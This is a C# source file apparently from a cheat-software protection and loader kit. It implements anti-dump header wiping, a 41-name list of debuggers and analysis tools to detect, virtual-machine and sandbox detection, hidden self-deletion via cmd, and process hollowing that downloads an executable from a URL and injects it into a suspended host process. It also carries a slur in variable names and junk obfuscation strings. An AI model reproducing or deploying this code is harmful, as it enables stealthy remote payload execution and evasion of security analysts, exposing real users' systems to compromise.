using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

public static unsafe class SoarProtect
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);
    [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
    private static extern int OneWayAttribute([In] IntPtr obj0, [In] int obj1, [In] int obj2);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpstartupfaggot, int[] lpProcessInfo);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);

    public static void AntiDump()
    {
        var process = System.Diagnostics.Process.GetCurrentProcess();
        var base_address = process.MainModule.BaseAddress;
        var dwpeheader = System.Runtime.InteropServices.Marshal.ReadInt32((IntPtr)(base_address.ToInt32() + 0x3C));
        var wnumberofsections = System.Runtime.InteropServices.Marshal.ReadInt16((IntPtr)(base_address.ToInt32() + dwpeheader + 0x6));

        for (int i = 0; i < peheaderwords.Length; i++)
        {
            EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderwords[i]), 2);
        }
        for (int i = 0; i < peheaderbytes.Length; i++)
        {
            EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderbytes[i]), 1);
        }

        int x = 0;
        int y = 0;

        while (x <= wnumberofsections)
        {
            if (y == 0)
            {
                EraseSection((IntPtr)((base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);
            }


            y++;

            if (y == sectiontabledwords.Length)
            {
                x++;
                y = 0;
            }
        }
    }

    private static int[] sectiontabledwords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
    private static int[] peheaderbytes = new int[] { 0x1A, 0x1B };
    private static int[] peheaderwords = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
    private static int[] peheaderdwords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };

private static void EraseSection(IntPtr address, int size)
    {
        IntPtr sz = (IntPtr)size;
        IntPtr dwOld = default(IntPtr);
        VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
        ZeroMemory(address, sz);
        IntPtr temp = default(IntPtr);
        VirtualProtect(address, sz, dwOld, ref temp);
    }

    private static IntPtr GetModuleHandle(string libName)
    {
        foreach (ProcessModule pMod in Process.GetCurrentProcess().Modules)
            if (pMod.ModuleName.ToLower().Contains(libName.ToLower()))
                return pMod.BaseAddress;
        return IntPtr.Zero;
    }
    private static bool RunDebug()
    {
        var returnvalue = false;

        if (Debugger.IsAttached || Debugger.IsLogging())
        {
            returnvalue = true;
        }
        else
        {
            var strArray = new string[41]
            {
                    "codecracker",
                    "x32dbg",
                    "x64dbg",
                    "ollydbg",
                    "ida",
                    "charles",
                    "dnspy",
                    "simpleassembly",
                    "peek",
                    "httpanalyzer",
                    "httpdebug",
                    "fiddler",
                    "wireshark",
                    "dbx",
                    "mdbg",
                    "gdb",
                    "windbg",
                    "dbgclr",
                    "kdb",
                    "kgdb",
                    "mdb",
                    "processhacker",
                    "scylla_x86",
                    "scylla_x64",
                    "scylla",
                    "idau64",
                    "idau",
                    "idaq",
                    "idaq64",
                    "idaw",
                    "idaw64",
                    "idag",
                    "idag64",
                    "ida64",
                    "ida",
                    "ImportREC",
                    "IMMUNITYDEBUGGER",
                    "MegaDumper",
                    "CodeBrowser",
                    "reshacker",
                    "cheat engine"
            };
            foreach (var process in Process.GetProcesses())
                if (process != Process.GetCurrentProcess())
                    for (var index = 0; index < strArray.Length; ++index)
                    {
                        if (process.ProcessName.ToLower().Contains(strArray[index])) returnvalue = true;

                        if (process.MainWindowTitle.ToLower().Contains(strArray[index])) returnvalue = true;
                    }
        }

        return returnvalue;
    }

    private static string ReturnProcessLists()
    {
        var processlist = Process.GetProcesses();

        var myCollection = new List<string>();

        foreach (var theprocess in processlist) myCollection.Add(theprocess.ProcessName);
        return string.Join("|", myCollection.ToArray());
    }

    public static bool SandBoxDetection()
    {
        return IsSandboxie();
    }

    public static bool CheckVM()
    {
        return SecurityDocumentElement();
    }

    public static bool IsDebuggerActive()
    {
        return RunDebug();
    }

    private static void ByteRunTest(byte[] bytes, string[] args)
    {
        Assembly exe = Assembly.Load(bytes);
        var ep = exe.EntryPoint;
        exe.CreateInstance(ep.Name);
        ep.Invoke(null, new object[] { args.Skip(1).ToArray<string>() });
    }


    public static void MemoryDumpProtection()
    {
        var handle = Process.GetCurrentProcess().Handle;
        while (true)
        {
            do
            {
                Thread.Sleep(16384);
                GC.Collect();
                GC.WaitForPendingFinalizers();
            } while (Environment.OSVersion.Platform != PlatformID.Win32NT);

            OneWayAttribute(handle, -1, -1);
        }
    }

    public static void DeleteActiveProcess()
    {
        Process.Start(new ProcessStartInfo("cmd.exe",
                "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" +
                Assembly.GetExecutingAssembly().Location + "\"")
        {
            WindowStyle = ProcessWindowStyle.Hidden
        })
            ?.Dispose();

        Process.GetCurrentProcess().Kill();
    }

    public static bool EmulatonCheck()
    {
        var millisecondsTimeout = new Random().Next(3000, 10000);
        var now = DateTime.Now;
        Thread.Sleep(millisecondsTimeout);
        if ((DateTime.Now - now).TotalMilliseconds >= millisecondsTimeout)
            return false;
        return true;
    }

    private static bool IsSandboxie()
    {
        if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
            return true;
        return false;
    }


    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    private static extern IntPtr GenericAcl(string lpModuleName);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    private static extern IntPtr TryCode(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", EntryPoint = "GetFileAttributes", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern uint ISymbolReader(string lpFileName);

    private static bool SecurityDocumentElement()
    {
        if (!MessageDictionary())
            return false;
        return true;
    }

    private static bool MessageDictionary()
    {
        if (SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX") ||
            SoapNcName("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX") ||
            SoapNcName("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX") ||
            SoapNcName("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey" || (int)ISymbolReader("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != -1 ||
            SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") ||
            SoapNcName("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey" ||
            SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")
            || SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE") ||
            SoapNcName("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper()) ||
            SoapNcName("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE") ||
            SoapNcName("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE") ||
            SoapNcName("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\") ||
            (int)ISymbolReader("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != -1 || (int)ISymbolReader("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != -1 ||
            TryCode(GenericAcl("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0 ||
            SoapNcName("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU") ||
            SoapNcName("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU"))
            return true;
        return false;
    }

    private static string SoapNcName([In] string obj0, [In] string obj1)
    {
        var registryKey = Registry.LocalMachine.OpenSubKey(obj0, false);
        if (registryKey == null)
            return "noKey";
        var obj = registryKey.GetValue(obj1, "noValueButYesKey");
        if (obj is string || registryKey.GetValueKind(obj1) == RegistryValueKind.String || registryKey.GetValueKind(obj1) == RegistryValueKind.ExpandString)
            return obj.ToString();
        if (registryKey.GetValueKind(obj1) == RegistryValueKind.DWord)
            return Convert.ToString((int)obj);
        if (registryKey.GetValueKind(obj1) == RegistryValueKind.QWord)
            return Convert.ToString((long)obj);
        if (registryKey.GetValueKind(obj1) == RegistryValueKind.Binary)
            return Convert.ToString((byte[])obj);
        if (registryKey.GetValueKind(obj1) == RegistryValueKind.MultiString)
            return string.Join("", (string[])obj);
        return "noValueButYesKey";
    }

    private struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    public static void FileToMemory(string link, string hostProcess, string optionalArguments = "")
    {
        byte[] soariscool = new System.Net.WebClient().DownloadData(link);
        test(soariscool, hostProcess, optionalArguments);
    }
    public static void FileToMemoryBeta(string link, [Optional]string[] optionalArguments)
    {
        byte[] soariscool = new System.Net.WebClient().DownloadData(link);
        ByteRunTest(soariscool, optionalArguments);
    }


    private static bool test(byte[] exeBuffer, string hostProcess, string optionalArguments = "")
    {
        // byte virtualizer
        byte[] data = KeyAuth.api.FromHex("536F61724368656174732332383438");
        string qzvlRgEesoalvlDyqOvckzKODJprfwwttuzlBbuxDobijT = "iMPNdHrIvUtmGqpfpCcZVrVSPSNHSMBxZJfmgfDjIcVcUhqiFsmcIJNqqwxLtjpjSwNxLCzKzsQsVtxibeCaZZpPvowjhs";
        Process[] pid = Process.GetProcessesByName("taskmgr");
        int leg;
        bool hmodule;
        STARTUPINFO startupfaggot = new STARTUPINFO();
        startupfaggot.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        startupfaggot.wShowWindow = SW_HIDE;
        var IMAGE_SECTION_HEADER = new byte[0x28];
        var IMAGE_NT_HEADERS = new byte[0xf8]; 
        var IMAGE_DOS_HEADER = new byte[0x40];
        string hook;
        leg = pid.Length;
        hmodule = pid.IsReadOnly;
        hook = pid.ToString();
        var PROCESS_INFO = new int[0x4]; 
        var CONTEXT = new byte[0x2cc];
        byte* pish;
        fixed (byte* p = &IMAGE_SECTION_HEADER[0])
            pish = p;
        byte* pinh;
        fixed (byte* p = &IMAGE_NT_HEADERS[0])
            pinh = p;
        byte* pidh;
        fixed (byte* p = &IMAGE_DOS_HEADER[0])
            pidh = p;
        byte* ctx;
        fixed (byte* p = &CONTEXT[0])
            ctx = p;
        *(uint*)(ctx + 0x0) = CONTEXT_FULL;

        // soars redirection protection
        string ZGJShiPmDrpghIrNyvshrAlRxOTxZvYcfkji = "qZnmJYTtXCtbdQsUUxzPjPhPJtHxBWGPdGCrFjjZOiHzgyvZWa"; qzvlRgEesoalvlDyqOvckzKODJprfwwttuzlBbuxDobijT = "TzkRIasYdQQVrAweyWNBPlNZAAIhiLxiaaCHe"; qzvlRgEesoalvlDyqOvckzKODJprfwwttuzlBbuxDobijT = ZGJShiPmDrpghIrNyvshrAlRxOTxZvYcfkji;
        bool eeMKkZZIzRZyASoASTSPHgrtZhmPxbtOpRRUgVwsuDAAtvebPQdziExynTlCmJLXXLIiBTUwX = true; bool ZVEfqzdCLzgyuflTShMjuGkrcdi = false; eeMKkZZIzRZyASoASTSPHgrtZhmPxbtOpRRUgVwsuDAAtvebPQdziExynTlCmJLXXLIiBTUwX = false; eeMKkZZIzRZyASoASTSPHgrtZhmPxbtOpRRUgVwsuDAAtvebPQdziExynTlCmJLXXLIiBTUwX = ZVEfqzdCLzgyuflTShMjuGkrcdi;
        Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);
        if (*(ushort*)(pidh + 0x0) != IMAGE_DOS_SIGNATURE)
            return false;
        var e_lfanew = *(int*)(pidh + 0x3c);
        Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);
        if (*(uint*)(pinh + 0x0) != IMAGE_NT_SIGNATURE)
            return false;
        if (!string.IsNullOrEmpty(optionalArguments))
            hostProcess += " " + optionalArguments;
        if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref startupfaggot, PROCESS_INFO))
            return false;
        var ImageBase = new IntPtr(*(int*)(pinh + 0x34));
        NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0], ImageBase);
        if (VirtualAllocEx((IntPtr)PROCESS_INFO[0], ImageBase, *(uint*)(pinh + 0x50), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
            test(exeBuffer, hostProcess, optionalArguments);
        fixed (byte* p = &exeBuffer[0])
            NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], ImageBase, (IntPtr)p, *(uint*)(pinh + 84), IntPtr.Zero);
        for (ushort i = 0; i < *(ushort*)(pinh + 0x6); i++)
        {
            Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
            fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14)])
                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc)), (IntPtr)p, *(uint*)(pish + 0x10), IntPtr.Zero);
        }
        NtGetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)ctx);
        NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)(*(uint*)(ctx + 0xAC)), ImageBase, 0x4, IntPtr.Zero);
        *(uint*)(ctx + 0xB0) = (uint)ImageBase + *(uint*)(pinh + 0x28);
        NtSetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)ctx);
        NtResumeThread((IntPtr)PROCESS_INFO[1], IntPtr.Zero);
        return true;
    }


    private const uint CONTEXT_FULL = 0x10007;
    private const int CREATE_SUSPENDED = 0x4;
    private const int MEM_COMMIT = 0x1000;
    private const int MEM_RESERVE = 0x2000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
    private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00
    private static short SW_SHOW = 5;
    private static short SW_HIDE = 0;
    private const uint STARTF_USESTDHANDLES = 0x00000100;
    private const uint STARTF_USESHOWWINDOW = 0x00000001;
}